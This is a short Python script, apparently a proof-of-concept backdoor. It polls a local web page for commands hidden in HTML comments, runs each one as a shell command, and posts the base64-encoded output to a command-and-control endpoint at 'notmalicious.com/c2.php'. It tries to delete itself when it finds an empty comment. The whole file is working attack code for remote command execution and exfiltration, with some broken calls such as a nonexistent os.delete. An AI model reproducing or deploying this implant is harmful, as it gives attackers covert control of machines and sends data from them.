import requests
import re
import subprocess
import time
import os

while 1:
	req = requests.get("http://192.168.1.145")
	comments = re.findall('<!--(.*)-->',req.text)
	for comment in comments:
		if comment == "":
			os.delete(__file__)	
		else:
			try:
				response = subprocess.check_output(comment.split())
			except:
				response = "command fail"
	data={"comment":(''.join(response)).encode("base64")}
	newreq = requests.post("http://notmalicious.com/c2.php", data=data)
	time.sleep(30)
